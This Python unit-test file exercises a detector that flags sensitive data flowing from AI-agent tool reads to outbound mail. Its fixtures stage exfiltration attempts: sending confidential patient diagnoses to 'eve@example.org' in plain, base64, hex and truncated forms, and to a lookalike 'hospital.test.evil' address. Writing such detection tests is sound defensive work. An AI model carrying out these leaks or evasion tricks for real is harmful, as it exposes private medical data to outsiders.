import sys,tempfile,unittest
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[1]/'detector'))
from business_flow import BusinessFlow
from session import ToolCall,register_tool

class Tests(unittest.TestCase):
    def test_return_cannot_remove_sensitive_label(self):
        flow=BusinessFlow();flow.observe('alice','s',ToolCall('records','read',{}),{'diagnosis':'Confidential patient diagnosis with identifying medical details.','classification':'public'})
        self.assertEqual(len(flow.sources),1)
        self.assertIn('sensitive-schema-field',next(iter(flow.sources.values()))['labels'])
    def test_admin_classifies_business_text(self):
        flow=BusinessFlow({'version':1,'sources':[{'server':'docs','tool':'read','fields':['text'],'label':'internal'}],'release':[]})
        flow.observe('alice','s',ToolCall('docs','read',{}),{'text':'Quarterly confidential commercial strategy for upcoming product launch.'})
        self.assertEqual(next(iter(flow.sources.values()))['labels'],['internal'])
    def test_hashed_ledger_survives_restart(self):
        with tempfile.TemporaryDirectory() as d:
            p=Path(d)/'state.sqlite';text='Confidential diagnosis of the patient and prescribed medication.'
            f=BusinessFlow(path=p);f.observe('alice','s',ToolCall('docs','read',{}),{'diagnosis':text});f.close()
            self.assertNotIn(text,p.read_bytes().decode(errors='ignore'))
            restored=BusinessFlow(path=p);self.assertTrue(restored.restored);self.assertEqual(len(restored.sources),1);restored.close()

    def test_encoded_and_partial_leak_has_witness(self):
        import base64
        register_tool('mail','send',{},'Send email',{'net'})
        text='Confidential medical diagnosis and full patient medication schedule across several visits.'
        f=BusinessFlow();f.observe('alice','s',ToolCall('docs','read',{}),{'diagnosis':text})
        for value in [text,base64.b64encode(text.encode()).decode(),text[:64],text.encode().hex()]:
            findings=f.check('alice','s',ToolCall('mail','send',{'to':'eve@example.org','body':value}))
            self.assertEqual(findings[0]['rule_id'],'r10-business-flow');self.assertEqual(len(findings[0]['path']),3)

    def test_exact_release_destination_not_prefix(self):
        register_tool('mail','send',{},'Send email',{'net'})
        policy={'version':1,'sources':[],'release':[{'principal':'alice','server':'mail','tool':'send','label':'sensitive-schema-field','destinations':['doctor@hospital.test']}]}
        f=BusinessFlow(policy);text='Confidential medical diagnosis with the identifying patient details.'
        f.observe('alice','s',ToolCall('docs','read',{}),{'diagnosis':text})
        self.assertFalse(f.check('alice','s',ToolCall('mail','send',{'to':'doctor@hospital.test','body':text})))
        self.assertTrue(f.check('alice','s',ToolCall('mail','send',{'to':'doctor@hospital.test.evil','body':text})))

    def test_actual_cross_principal_read_then_egress(self):
        register_tool('mail','send',{},'Send email',{'net'})
        text='Sensitive diagnosis and detailed patient history with full private clinical notes.'
        f=BusinessFlow();f.observe('alice','a',ToolCall('docs','read',{}),{'diagnosis':text})
        self.assertFalse(f.check('bob','b',ToolCall('mail','send',{'to':'eve@example.org','body':text})))
        f.observe('bob','b',ToolCall('memory','read',{}),{'text':text})
        self.assertTrue(f.check('bob','b',ToolCall('mail','send',{'to':'eve@example.org','body':text})))
        witness=f.check('bob','b',ToolCall('mail','send',{'to':'eve@example.org','body':text}))[0]
        self.assertEqual(len(witness['path']),4)

    def test_same_bytes_merge_labels_monotonically(self):
        policy={'version':1,'sources':[{'server':'docs','tool':'read','fields':['text'],'label':'internal'}],'release':[]}
        f=BusinessFlow(policy);text='Private business data with enough length for reliable exact matching.'
        f.observe('alice','a',ToolCall('docs','read',{}),{'text':text})
        f.observe('alice','a',ToolCall('records','read',{}),{'diagnosis':text})
        self.assertEqual(next(iter(f.sources.values()))['labels'],['internal','sensitive-schema-field'])
        f.observe('alice','a',ToolCall('docs','read',{}),{'text':text,'classification':'public'})
        self.assertEqual(len(next(iter(f.sources.values()))['labels']),2)

if __name__=='__main__':unittest.main()
